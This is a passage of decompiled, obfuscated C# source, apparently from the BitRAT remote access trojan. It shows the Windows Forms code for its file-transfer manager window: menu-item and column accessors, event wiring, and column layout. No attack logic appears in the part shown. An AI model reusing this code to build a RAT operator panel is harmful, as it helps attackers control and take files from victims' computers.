﻿using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using BitRAT;
using BrightIdeasSoftware;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x020001A6 RID: 422
[DesignerGenerated]
public sealed partial class fTransferManager : Form
{
	// Token: 0x0600175B RID: 5979 RVA: 0x000AC4B4 File Offset: 0x000AA6B4
	public fTransferManager()
	{
		base.Load += this.fTransferManager_Load;
		base.FormClosing += this.fTransferManager_FormClosing;
		this.collection_0 = new Collection();
		this.concurrentStack_0 = new ConcurrentStack<cTransfer>();
		this.concurrentStack_1 = new ConcurrentStack<cTransfer>();
		this.concurrentStack_2 = new ConcurrentStack<cTransfer>();
		this.InitializeComponent();
	}

	// Token: 0x0600175E RID: 5982 RVA: 0x0000C0D3 File Offset: 0x0000A2D3
	internal ContextMenuStrip vmethod_0()
	{
		return this.contextMenuStrip_0;
	}

	// Token: 0x0600175F RID: 5983 RVA: 0x0000C0DB File Offset: 0x0000A2DB
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(ContextMenuStrip contextMenuStrip_1)
	{
		this.contextMenuStrip_0 = contextMenuStrip_1;
	}

	// Token: 0x06001760 RID: 5984 RVA: 0x0000C0E4 File Offset: 0x0000A2E4
	internal ToolStripMenuItem vmethod_2()
	{
		return this.toolStripMenuItem_0;
	}

	// Token: 0x06001761 RID: 5985 RVA: 0x000AD764 File Offset: 0x000AB964
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(ToolStripMenuItem toolStripMenuItem_18)
	{
		EventHandler value = new EventHandler(this.method_18);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_0;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_0 = toolStripMenuItem_18;
		toolStripMenuItem = this.toolStripMenuItem_0;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001762 RID: 5986 RVA: 0x0000C0EC File Offset: 0x0000A2EC
	internal ToolStripSeparator vmethod_4()
	{
		return this.toolStripSeparator_0;
	}

	// Token: 0x06001763 RID: 5987 RVA: 0x0000C0F4 File Offset: 0x0000A2F4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(ToolStripSeparator toolStripSeparator_7)
	{
		this.toolStripSeparator_0 = toolStripSeparator_7;
	}

	// Token: 0x06001764 RID: 5988 RVA: 0x0000C0FD File Offset: 0x0000A2FD
	internal ToolStripMenuItem vmethod_6()
	{
		return this.toolStripMenuItem_1;
	}

	// Token: 0x06001765 RID: 5989 RVA: 0x0000C105 File Offset: 0x0000A305
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(ToolStripMenuItem toolStripMenuItem_18)
	{
		this.toolStripMenuItem_1 = toolStripMenuItem_18;
	}

	// Token: 0x06001766 RID: 5990 RVA: 0x0000C10E File Offset: 0x0000A30E
	internal ToolStripMenuItem vmethod_8()
	{
		return this.toolStripMenuItem_2;
	}

	// Token: 0x06001767 RID: 5991 RVA: 0x000AD7A8 File Offset: 0x000AB9A8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(ToolStripMenuItem toolStripMenuItem_18)
	{
		EventHandler value = new EventHandler(this.method_21);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_2 = toolStripMenuItem_18;
		toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001768 RID: 5992 RVA: 0x0000C116 File Offset: 0x0000A316
	internal ToolStripSeparator vmethod_10()
	{
		return this.toolStripSeparator_1;
	}

	// Token: 0x06001769 RID: 5993 RVA: 0x0000C11E File Offset: 0x0000A31E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(ToolStripSeparator toolStripSeparator_7)
	{
		this.toolStripSeparator_1 = toolStripSeparator_7;
	}

	// Token: 0x0600176A RID: 5994 RVA: 0x0000C127 File Offset: 0x0000A327
	internal ToolStripMenuItem vmethod_12()
	{
		return this.toolStripMenuItem_3;
	}

	// Token: 0x0600176B RID: 5995 RVA: 0x000AD7EC File Offset: 0x000AB9EC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(ToolStripMenuItem toolStripMenuItem_18)
	{
		EventHandler value = new EventHandler(this.method_20);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_3;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_3 = toolStripMenuItem_18;
		toolStripMenuItem = this.toolStripMenuItem_3;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600176C RID: 5996 RVA: 0x0000C12F File Offset: 0x0000A32F
	internal ToolStripMenuItem vmethod_14()
	{
		return this.toolStripMenuItem_4;
	}

	// Token: 0x0600176D RID: 5997 RVA: 0x000AD830 File Offset: 0x000ABA30
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(ToolStripMenuItem toolStripMenuItem_18)
	{
		EventHandler value = new EventHandler(this.method_22);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_4 = toolStripMenuItem_18;
		toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600176E RID: 5998 RVA: 0x0000C137 File Offset: 0x0000A337
	internal ToolStripMenuItem vmethod_16()
	{
		return this.toolStripMenuItem_5;
	}

	// Token: 0x0600176F RID: 5999 RVA: 0x000AD874 File Offset: 0x000ABA74
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(ToolStripMenuItem toolStripMenuItem_18)
	{
		EventHandler value = new EventHandler(this.method_23);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_5;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_5 = toolStripMenuItem_18;
		toolStripMenuItem = this.toolStripMenuItem_5;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001770 RID: 6000 RVA: 0x0000C13F File Offset: 0x0000A33F
	internal ToolStripSeparator vmethod_18()
	{
		return this.toolStripSeparator_2;
	}

	// Token: 0x06001771 RID: 6001 RVA: 0x0000C147 File Offset: 0x0000A347
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_19(ToolStripSeparator toolStripSeparator_7)
	{
		this.toolStripSeparator_2 = toolStripSeparator_7;
	}

	// Token: 0x06001772 RID: 6002 RVA: 0x0000C150 File Offset: 0x0000A350
	internal FastObjectListView vmethod_20()
	{
		return this.fastObjectListView_0;
	}

	// Token: 0x06001773 RID: 6003 RVA: 0x000AD8B8 File Offset: 0x000ABAB8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_21(FastObjectListView fastObjectListView_1)
	{
		MouseEventHandler value = new MouseEventHandler(this.method_24);
		EventHandler<FormatRowEventArgs> eventHandler = new EventHandler<FormatRowEventArgs>(this.method_27);
		EventHandler value2 = new EventHandler(this.method_28);
		EventHandler<CreateGroupsEventArgs> eventHandler2 = new EventHandler<CreateGroupsEventArgs>(this.method_32);
		EventHandler value3 = new EventHandler(this.method_39);
		EventHandler<GroupExpandingCollapsingEventArgs> eventHandler3 = new EventHandler<GroupExpandingCollapsingEventArgs>(this.method_40);
		EventHandler<CreateGroupsEventArgs> eventHandler4 = new EventHandler<CreateGroupsEventArgs>(this.method_41);
		ColumnWidthChangingEventHandler value4 = new ColumnWidthChangingEventHandler(this.method_42);
		FastObjectListView fastObjectListView = this.fastObjectListView_0;
		if (fastObjectListView != null)
		{
			fastObjectListView.MouseUp -= value;
			fastObjectListView.FormatRow -= eventHandler;
			fastObjectListView.SelectedIndexChanged -= value2;
			fastObjectListView.AboutToCreateGroups -= eventHandler2;
			fastObjectListView.DoubleClick -= value3;
			fastObjectListView.GroupExpandingCollapsing -= eventHandler3;
			fastObjectListView.BeforeCreatingGroups -= eventHandler4;
			fastObjectListView.ColumnWidthChanging -= value4;
		}
		this.fastObjectListView_0 = fastObjectListView_1;
		fastObjectListView = this.fastObjectListView_0;
		if (fastObjectListView != null)
		{
			fastObjectListView.MouseUp += value;
			fastObjectListView.FormatRow += eventHandler;
			fastObjectListView.SelectedIndexChanged += value2;
			fastObjectListView.AboutToCreateGroups += eventHandler2;
			fastObjectListView.DoubleClick += value3;
			fastObjectListView.GroupExpandingCollapsing += eventHandler3;
			fastObjectListView.BeforeCreatingGroups += eventHandler4;
			fastObjectListView.ColumnWidthChanging += value4;
		}
	}

	// Token: 0x06001774 RID: 6004 RVA: 0x0000C158 File Offset: 0x0000A358
	internal OLVColumn vmethod_22()
	{
		return this.olvcolumn_0;
	}

	// Token: 0x06001775 RID: 6005 RVA: 0x0000C160 File Offset: 0x0000A360
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_23(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_0 = olvcolumn_10;
	}

	// Token: 0x06001776 RID: 6006 RVA: 0x0000C169 File Offset: 0x0000A369
	internal OLVColumn vmethod_24()
	{
		return this.olvcolumn_1;
	}

	// Token: 0x06001777 RID: 6007 RVA: 0x0000C171 File Offset: 0x0000A371
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_25(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_1 = olvcolumn_10;
	}

	// Token: 0x06001778 RID: 6008 RVA: 0x0000C17A File Offset: 0x0000A37A
	internal OLVColumn vmethod_26()
	{
		return this.olvcolumn_2;
	}

	// Token: 0x06001779 RID: 6009 RVA: 0x0000C182 File Offset: 0x0000A382
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_27(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_2 = olvcolumn_10;
	}

	// Token: 0x0600177A RID: 6010 RVA: 0x0000C18B File Offset: 0x0000A38B
	internal OLVColumn vmethod_28()
	{
		return this.olvcolumn_3;
	}

	// Token: 0x0600177B RID: 6011 RVA: 0x0000C193 File Offset: 0x0000A393
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_29(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_3 = olvcolumn_10;
	}

	// Token: 0x0600177C RID: 6012 RVA: 0x0000C19C File Offset: 0x0000A39C
	internal OLVColumn vmethod_30()
	{
		return this.olvcolumn_4;
	}

	// Token: 0x0600177D RID: 6013 RVA: 0x0000C1A4 File Offset: 0x0000A3A4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_31(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_4 = olvcolumn_10;
	}

	// Token: 0x0600177E RID: 6014 RVA: 0x0000C1AD File Offset: 0x0000A3AD
	internal OLVColumn vmethod_32()
	{
		return this.olvcolumn_5;
	}

	// Token: 0x0600177F RID: 6015 RVA: 0x0000C1B5 File Offset: 0x0000A3B5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_33(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_5 = olvcolumn_10;
	}

	// Token: 0x06001780 RID: 6016 RVA: 0x0000C1BE File Offset: 0x0000A3BE
	internal OLVColumn vmethod_34()
	{
		return this.olvcolumn_6;
	}

	// Token: 0x06001781 RID: 6017 RVA: 0x0000C1C6 File Offset: 0x0000A3C6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_35(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_6 = olvcolumn_10;
	}

	// Token: 0x06001782 RID: 6018 RVA: 0x0000C1CF File Offset: 0x0000A3CF
	internal OLVColumn vmethod_36()
	{
		return this.olvcolumn_7;
	}

	// Token: 0x06001783 RID: 6019 RVA: 0x0000C1D7 File Offset: 0x0000A3D7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_37(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_7 = olvcolumn_10;
	}

	// Token: 0x06001784 RID: 6020 RVA: 0x0000C1E0 File Offset: 0x0000A3E0
	internal StatusStrip vmethod_38()
	{
		return this.statusStrip_0;
	}

	// Token: 0x06001785 RID: 6021 RVA: 0x0000C1E8 File Offset: 0x0000A3E8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_39(StatusStrip statusStrip_1)
	{
		this.statusStrip_0 = statusStrip_1;
	}

	// Token: 0x06001786 RID: 6022 RVA: 0x0000C1F1 File Offset: 0x0000A3F1
	internal ToolStripStatusLabel vmethod_40()
	{
		return this.toolStripStatusLabel_0;
	}

	// Token: 0x06001787 RID: 6023 RVA: 0x0000C1F9 File Offset: 0x0000A3F9
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_41(ToolStripStatusLabel toolStripStatusLabel_7)
	{
		this.toolStripStatusLabel_0 = toolStripStatusLabel_7;
	}

	// Token: 0x06001788 RID: 6024 RVA: 0x0000C202 File Offset: 0x0000A402
	internal ToolStripStatusLabel vmethod_42()
	{
		return this.toolStripStatusLabel_1;
	}

	// Token: 0x06001789 RID: 6025 RVA: 0x0000C20A File Offset: 0x0000A40A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_43(ToolStripStatusLabel toolStripStatusLabel_7)
	{
		this.toolStripStatusLabel_1 = toolStripStatusLabel_7;
	}

	// Token: 0x0600178A RID: 6026 RVA: 0x0000C213 File Offset: 0x0000A413
	internal System.Windows.Forms.Timer vmethod_44()
	{
		return this.timer_0;
	}

	// Token: 0x0600178B RID: 6027 RVA: 0x000AD9C8 File Offset: 0x000ABBC8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_45(System.Windows.Forms.Timer timer_1)
	{
		EventHandler value = new EventHandler(this.method_25);
		System.Windows.Forms.Timer timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_0 = timer_1;
		timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x0600178C RID: 6028 RVA: 0x0000C21B File Offset: 0x0000A41B
	internal OLVColumn vmethod_46()
	{
		return this.olvcolumn_8;
	}

	// Token: 0x0600178D RID: 6029 RVA: 0x0000C223 File Offset: 0x0000A423
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_47(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_8 = olvcolumn_10;
	}

	// Token: 0x0600178E RID: 6030 RVA: 0x0000C22C File Offset: 0x0000A42C
	internal ToolStripStatusLabel vmethod_48()
	{
		return this.toolStripStatusLabel_2;
	}

	// Token: 0x0600178F RID: 6031 RVA: 0x0000C234 File Offset: 0x0000A434
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_49(ToolStripStatusLabel toolStripStatusLabel_7)
	{
		this.toolStripStatusLabel_2 = toolStripStatusLabel_7;
	}

	// Token: 0x06001790 RID: 6032 RVA: 0x0000C23D File Offset: 0x0000A43D
	internal ToolStripStatusLabel vmethod_50()
	{
		return this.toolStripStatusLabel_3;
	}

	// Token: 0x06001791 RID: 6033 RVA: 0x0000C245 File Offset: 0x0000A445
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_51(ToolStripStatusLabel toolStripStatusLabel_7)
	{
		this.toolStripStatusLabel_3 = toolStripStatusLabel_7;
	}

	// Token: 0x06001792 RID: 6034 RVA: 0x0000C24E File Offset: 0x0000A44E
	internal ToolStripStatusLabel vmethod_52()
	{
		return this.toolStripStatusLabel_4;
	}

	// Token: 0x06001793 RID: 6035 RVA: 0x0000C256 File Offset: 0x0000A456
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_53(ToolStripStatusLabel toolStripStatusLabel_7)
	{
		this.toolStripStatusLabel_4 = toolStripStatusLabel_7;
	}

	// Token: 0x06001794 RID: 6036 RVA: 0x0000C25F File Offset: 0x0000A45F
	internal ToolStripStatusLabel vmethod_54()
	{
		return this.toolStripStatusLabel_5;
	}

	// Token: 0x06001795 RID: 6037 RVA: 0x0000C267 File Offset: 0x0000A467
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_55(ToolStripStatusLabel toolStripStatusLabel_7)
	{
		this.toolStripStatusLabel_5 = toolStripStatusLabel_7;
	}

	// Token: 0x06001796 RID: 6038 RVA: 0x0000C270 File Offset: 0x0000A470
	internal BackgroundWorker vmethod_56()
	{
		return this.backgroundWorker_0;
	}

	// Token: 0x06001797 RID: 6039 RVA: 0x000ADA0C File Offset: 0x000ABC0C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_57(BackgroundWorker backgroundWorker_1)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_38);
		BackgroundWorker backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_0 = backgroundWorker_1;
		backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x06001798 RID: 6040 RVA: 0x0000C278 File Offset: 0x0000A478
	internal ToolStripMenuItem vmethod_58()
	{
		return this.toolStripMenuItem_6;
	}

	// Token: 0x06001799 RID: 6041 RVA: 0x0000C280 File Offset: 0x0000A480
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_59(ToolStripMenuItem toolStripMenuItem_18)
	{
		this.toolStripMenuItem_6 = toolStripMenuItem_18;
	}

	// Token: 0x0600179A RID: 6042 RVA: 0x0000C289 File Offset: 0x0000A489
	internal ToolStripMenuItem vmethod_60()
	{
		return this.toolStripMenuItem_7;
	}

	// Token: 0x0600179B RID: 6043 RVA: 0x000ADA50 File Offset: 0x000ABC50
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_61(ToolStripMenuItem toolStripMenuItem_18)
	{
		EventHandler value = new EventHandler(this.method_29);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_7;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_7 = toolStripMenuItem_18;
		toolStripMenuItem = this.toolStripMenuItem_7;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600179C RID: 6044 RVA: 0x0000C291 File Offset: 0x0000A491
	internal ToolStripSeparator vmethod_62()
	{
		return this.toolStripSeparator_3;
	}

	// Token: 0x0600179D RID: 6045 RVA: 0x0000C299 File Offset: 0x0000A499
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_63(ToolStripSeparator toolStripSeparator_7)
	{
		this.toolStripSeparator_3 = toolStripSeparator_7;
	}

	// Token: 0x0600179E RID: 6046 RVA: 0x0000C2A2 File Offset: 0x0000A4A2
	internal ToolStripMenuItem vmethod_64()
	{
		return this.toolStripMenuItem_8;
	}

	// Token: 0x0600179F RID: 6047 RVA: 0x000ADA94 File Offset: 0x000ABC94
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_65(ToolStripMenuItem toolStripMenuItem_18)
	{
		EventHandler value = new EventHandler(this.method_30);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_8;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_8 = toolStripMenuItem_18;
		toolStripMenuItem = this.toolStripMenuItem_8;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060017A0 RID: 6048 RVA: 0x0000C2AA File Offset: 0x0000A4AA
	internal ToolStripSeparator vmethod_66()
	{
		return this.toolStripSeparator_4;
	}

	// Token: 0x060017A1 RID: 6049 RVA: 0x0000C2B2 File Offset: 0x0000A4B2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_67(ToolStripSeparator toolStripSeparator_7)
	{
		this.toolStripSeparator_4 = toolStripSeparator_7;
	}

	// Token: 0x060017A2 RID: 6050 RVA: 0x0000C2BB File Offset: 0x0000A4BB
	internal ToolStripStatusLabel vmethod_68()
	{
		return this.toolStripStatusLabel_6;
	}

	// Token: 0x060017A3 RID: 6051 RVA: 0x0000C2C3 File Offset: 0x0000A4C3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_69(ToolStripStatusLabel toolStripStatusLabel_7)
	{
		this.toolStripStatusLabel_6 = toolStripStatusLabel_7;
	}

	// Token: 0x060017A4 RID: 6052 RVA: 0x0000C2CC File Offset: 0x0000A4CC
	internal OLVColumn vmethod_70()
	{
		return this.olvcolumn_9;
	}

	// Token: 0x060017A5 RID: 6053 RVA: 0x0000C2D4 File Offset: 0x0000A4D4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_71(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_9 = olvcolumn_10;
	}

	// Token: 0x060017A6 RID: 6054 RVA: 0x0000C2DD File Offset: 0x0000A4DD
	internal ToolStripMenuItem vmethod_72()
	{
		return this.toolStripMenuItem_9;
	}

	// Token: 0x060017A7 RID: 6055 RVA: 0x0000C2E5 File Offset: 0x0000A4E5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_73(ToolStripMenuItem toolStripMenuItem_18)
	{
		this.toolStripMenuItem_9 = toolStripMenuItem_18;
	}

	// Token: 0x060017A8 RID: 6056 RVA: 0x0000C2EE File Offset: 0x0000A4EE
	internal ToolStripMenuItem vmethod_74()
	{
		return this.toolStripMenuItem_10;
	}

	// Token: 0x060017A9 RID: 6057 RVA: 0x0000C2F6 File Offset: 0x0000A4F6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_75(ToolStripMenuItem toolStripMenuItem_18)
	{
		this.toolStripMenuItem_10 = toolStripMenuItem_18;
	}

	// Token: 0x060017AA RID: 6058 RVA: 0x0000C2FF File Offset: 0x0000A4FF
	internal ToolStripMenuItem vmethod_76()
	{
		return this.toolStripMenuItem_11;
	}

	// Token: 0x060017AB RID: 6059 RVA: 0x000ADAD8 File Offset: 0x000ABCD8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_77(ToolStripMenuItem toolStripMenuItem_18)
	{
		EventHandler value = new EventHandler(this.method_33);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_11;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_11 = toolStripMenuItem_18;
		toolStripMenuItem = this.toolStripMenuItem_11;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060017AC RID: 6060 RVA: 0x0000C307 File Offset: 0x0000A507
	internal ToolStripMenuItem vmethod_78()
	{
		return this.toolStripMenuItem_12;
	}

	// Token: 0x060017AD RID: 6061 RVA: 0x0000C30F File Offset: 0x0000A50F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_79(ToolStripMenuItem toolStripMenuItem_18)
	{
		this.toolStripMenuItem_12 = toolStripMenuItem_18;
	}

	// Token: 0x060017AE RID: 6062 RVA: 0x0000C318 File Offset: 0x0000A518
	internal ToolStripMenuItem vmethod_80()
	{
		return this.toolStripMenuItem_13;
	}

	// Token: 0x060017AF RID: 6063 RVA: 0x000ADB1C File Offset: 0x000ABD1C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_81(ToolStripMenuItem toolStripMenuItem_18)
	{
		EventHandler value = new EventHandler(this.method_34);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_13;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_13 = toolStripMenuItem_18;
		toolStripMenuItem = this.toolStripMenuItem_13;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060017B0 RID: 6064 RVA: 0x0000C320 File Offset: 0x0000A520
	internal ToolStripMenuItem vmethod_82()
	{
		return this.toolStripMenuItem_14;
	}

	// Token: 0x060017B1 RID: 6065 RVA: 0x000ADB60 File Offset: 0x000ABD60
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_83(ToolStripMenuItem toolStripMenuItem_18)
	{
		EventHandler value = new EventHandler(this.method_35);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_14;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_14 = toolStripMenuItem_18;
		toolStripMenuItem = this.toolStripMenuItem_14;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060017B2 RID: 6066 RVA: 0x0000C328 File Offset: 0x0000A528
	internal ToolStripMenuItem vmethod_84()
	{
		return this.toolStripMenuItem_15;
	}

	// Token: 0x060017B3 RID: 6067 RVA: 0x0000C330 File Offset: 0x0000A530
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_85(ToolStripMenuItem toolStripMenuItem_18)
	{
		this.toolStripMenuItem_15 = toolStripMenuItem_18;
	}

	// Token: 0x060017B4 RID: 6068 RVA: 0x0000C339 File Offset: 0x0000A539
	internal ToolStripMenuItem vmethod_86()
	{
		return this.toolStripMenuItem_16;
	}

	// Token: 0x060017B5 RID: 6069 RVA: 0x000ADBA4 File Offset: 0x000ABDA4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_87(ToolStripMenuItem toolStripMenuItem_18)
	{
		EventHandler value = new EventHandler(this.method_36);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_16;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_16 = toolStripMenuItem_18;
		toolStripMenuItem = this.toolStripMenuItem_16;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060017B6 RID: 6070 RVA: 0x0000C341 File Offset: 0x0000A541
	internal ToolStripSeparator vmethod_88()
	{
		return this.toolStripSeparator_5;
	}

	// Token: 0x060017B7 RID: 6071 RVA: 0x0000C349 File Offset: 0x0000A549
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_89(ToolStripSeparator toolStripSeparator_7)
	{
		this.toolStripSeparator_5 = toolStripSeparator_7;
	}

	// Token: 0x060017B8 RID: 6072 RVA: 0x0000C352 File Offset: 0x0000A552
	internal ToolStripMenuItem vmethod_90()
	{
		return this.toolStripMenuItem_17;
	}

	// Token: 0x060017B9 RID: 6073 RVA: 0x000ADBE8 File Offset: 0x000ABDE8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_91(ToolStripMenuItem toolStripMenuItem_18)
	{
		EventHandler value = new EventHandler(this.method_37);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_17;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_17 = toolStripMenuItem_18;
		toolStripMenuItem = this.toolStripMenuItem_17;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060017BA RID: 6074 RVA: 0x0000C35A File Offset: 0x0000A55A
	internal ToolStripSeparator vmethod_92()
	{
		return this.toolStripSeparator_6;
	}

	// Token: 0x060017BB RID: 6075 RVA: 0x0000C362 File Offset: 0x0000A562
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_93(ToolStripSeparator toolStripSeparator_7)
	{
		this.toolStripSeparator_6 = toolStripSeparator_7;
	}

	// Token: 0x060017BC RID: 6076 RVA: 0x0000C36B File Offset: 0x0000A56B
	internal BarRenderer vmethod_94()
	{
		return this.barRenderer_0;
	}

	// Token: 0x060017BD RID: 6077 RVA: 0x0000C373 File Offset: 0x0000A573
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_95(BarRenderer barRenderer_1)
	{
		this.barRenderer_0 = barRenderer_1;
	}

	// Token: 0x060017BE RID: 6078 RVA: 0x0000C37C File Offset: 0x0000A57C
	private void fTransferManager_Load(object sender, EventArgs e)
	{
		this.method_0();
	}

	// Token: 0x060017BF RID: 6079 RVA: 0x00007348 File Offset: 0x00005548
	private void fTransferManager_FormClosing(object sender, FormClosingEventArgs e)
	{
		base.Visible = false;
		e.Cancel = true;
	}

	// Token: 0x060017C0 RID: 6080 RVA: 0x000ADC2C File Offset: 0x000ABE2C
	public void method_0()
	{
		base.Width = 1080;
		base.Height = 458;
		this.vmethod_20().VirtualMode = true;
		this.vmethod_20().View = View.Details;
		this.vmethod_20().FullRowSelect = true;
		this.vmethod_20().OwnerDraw = true;
		this.vmethod_20().Columns[0].Width = 160;
		this.vmethod_20().Columns[1].Width = 120;
		this.vmethod_20().Columns[2].Width = 80;
		this.vmethod_20().Columns[3].Width = 120;
		this.vmethod_20().Columns[4].Width = 180;
		this.vmethod_20().Columns[5].Width = 100;
		this.vmethod_20().Columns[6].Width = 80;
		this.vmethod_20().Columns[7].Width = 80;
		this.vmethod_20().Columns[8].Width = 80;
		this.vmethod_20().GridLines = Class135.smethod_0().Gridlines;
		this.vmethod_56().RunWorkerAsync();
		base.Opacity = 100.0;
	}

	// Token: 0x060017C1 RID: 6081 RVA: 0x000ADD8C File Offset: 0x000ABF8C
